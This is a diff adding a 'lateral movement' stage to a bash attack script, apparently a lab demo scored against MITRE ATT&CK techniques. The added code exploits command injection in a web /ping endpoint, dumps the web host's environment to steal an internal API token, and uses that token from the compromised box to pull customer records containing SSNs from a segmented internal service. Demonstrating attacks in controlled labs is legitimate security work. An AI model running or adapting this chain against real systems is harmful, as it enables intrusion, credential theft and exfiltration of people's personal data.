@@ -304,6 +304,66 @@ else
 fi
 
 # ==========================================================================
+# TECHNIQUE 8 — LATERAL MOVEMENT: pivot through the web RCE to the SEGMENTED
+# internal admin tier (the crown jewels).
+#
+# The internal "BackOffice" service holds the customer datastore. It lives on a
+# separate, internal-only network — THIS attacker box has no route to it. We
+# prove that (a direct hit fails), then weaponise the web RCE from technique 4 as
+# a pivot: read the web tier's environment to loot the shared internal token,
+# then call the internal service FROM the web box and exfiltrate the customer PII.
+# ==========================================================================
+technique 8 "Lateral Movement — pivot via RCE to the internal tier" "T1210" "Exploitation of Remote Services"
+
+INTERNAL_HOST="${INTERNAL_HOST:-internal}"
+INTERNAL_PORT="${INTERNAL_PORT:-9000}"
+LOOT_PATH="/admin/customers"
+
+# rce <shell-command> — run a command on the WEB box through the /ping command
+# injection and return the combined stdout (ping noise + the command's output).
+rce() {
+  "${CURL[@]}" -G "${WEB_URL}/ping" --data-urlencode "host=127.0.0.1;$1" \
+    | sed -e 's#<pre>##g' -e 's#</pre>##g'
+}
+
+# 8a. Negative control: from THIS box the internal tier is unreachable (no route /
+# unresolvable service name) — that is the network segmentation working.
+direct="$("${CURL[@]}" --max-time 5 "http://${INTERNAL_HOST}:${INTERNAL_PORT}${LOOT_PATH}" 2>&1)"
+direct_rc=$?
+if [ "$direct_rc" -ne 0 ] || printf '%s' "$direct" | grep -qiE 'could not resolve|couldn.t connect|connection refused|timed out|failure'; then
+  direct_blocked=1
+  printf 'direct  curl http://%s:%s%s  ->  NO ROUTE (segmented away)\n' \
+    "$INTERNAL_HOST" "$INTERNAL_PORT" "$LOOT_PATH" | evidence
+else
+  direct_blocked=0
+  printf 'direct  curl http://%s:%s%s  ->  %s\n' \
+    "$INTERNAL_HOST" "$INTERNAL_PORT" "$LOOT_PATH" \
+    "$(printf '%s' "$direct" | head -c 80)" | evidence
+fi
+
+# 8b. Discovery: use the web RCE to read the web tier's environment and loot the
+# shared internal-service token (Unsecured Credentials in the environment, T1552.001).
+env_dump="$(rce 'printenv')"
+loot_token="$(printf '%s' "$env_dump" | grep -oE 'INTERNAL_API_TOKEN=[^[:space:]]+' | head -1 | cut -d= -f2-)"
+[ -z "$loot_token" ] && loot_token="$(printf '%s' "$env_dump" | grep -oE 'sk_internal_[A-Za-z0-9_]+' | head -1)"
+printf 'pivot   RCE printenv on web  ->  looted internal token: %s\n' "${loot_token:-<none>}" | evidence
+
+# 8c. Lateral movement: call the internal tier FROM the web box, authenticating
+# with the looted token, and pull back the customer datastore.
+pivot_url="http://${INTERNAL_HOST}:${INTERNAL_PORT}${LOOT_PATH}?token=${loot_token}"
+loot="$(rce "wget -qO- '${pivot_url}'")"
+printf 'pivot   RCE wget %s\n%s\n' "$pivot_url" "$(printf '%s' "$loot" | tail -c 400)" | evidence
+
+# Verdict: the pivot must (a) have been blocked directly AND (b) succeed via the
+# web RCE — the segmentation holds, but the foothold defeats it.
+if printf '%s' "$loot" | grep -qiE '"ssn"|"customers"' && \
+   ! printf '%s' "$direct" | grep -qiE '"ssn"|"customers"'; then
+  verdict pass "internal tier unreachable directly, but the web RCE pivots in and exfiltrates the customer datastore"
+else
+  verdict fail "could not demonstrate the segmented pivot (internal tier reachable directly, or the pivot was blocked)"
+fi
+
+# ==========================================================================
 # Scorecard
 # ==========================================================================
 printf '\n%s\n' "${C_BOLD}${C_CYAN}==============================================================================${C_RESET}"
